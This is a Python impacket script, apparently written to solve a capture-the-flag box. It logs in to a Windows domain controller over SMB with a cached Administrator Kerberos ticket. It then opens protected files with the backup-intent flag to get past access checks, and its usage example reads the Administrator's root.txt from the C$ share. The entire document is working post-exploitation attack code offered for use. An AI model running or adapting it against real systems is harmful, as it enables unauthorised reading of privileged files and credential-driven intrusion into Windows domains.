#!/usr/bin/env python3
"""Read a protected SMB file using FILE_OPEN_FOR_BACKUP_INTENT.

Example:
  KRB5CCNAME=/tmp/Administrator.ccache \
  python3 backup_intent_read.py --host dc01.darkzero.htb \
    --realm darkzero.ext --kdc DC02.darkzero.ext \
    --share C$ --path 'Users\\Administrator\\Desktop\\root.txt'
"""
import argparse
import os
from impacket.smbconnection import SMBConnection

FILE_NON_DIRECTORY_FILE = 0x00000040
FILE_OPEN_FOR_BACKUP_INTENT = 0x00004000


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--realm", required=True)
    ap.add_argument("--kdc", required=True)
    ap.add_argument("--share", default="C$")
    ap.add_argument("--path", required=True)
    ap.add_argument("--ccache")
    ap.add_argument("--user", default="Administrator")
    ap.add_argument("--port", type=int, default=445)
    args = ap.parse_args()

    if args.ccache:
        os.environ["KRB5CCNAME"] = f"FILE:{args.ccache}"

    c = SMBConnection(args.host, args.host, sess_port=args.port, timeout=20)
    c.kerberosLogin(
        args.user, "", args.realm,
        useCache=True, kdcHost=args.kdc,
    )

    f = c.openFile(
        args.share,
        args.path,
        desiredAccess=0x80000000,
        shareMode=0x7,
        creationOption=FILE_NON_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT,
        creationDisposition=1,
    )
    data = f.read(1024 * 1024)
    f.close()
    print(data.decode("utf-8", "replace"), end="")


if __name__ == "__main__":
    main()
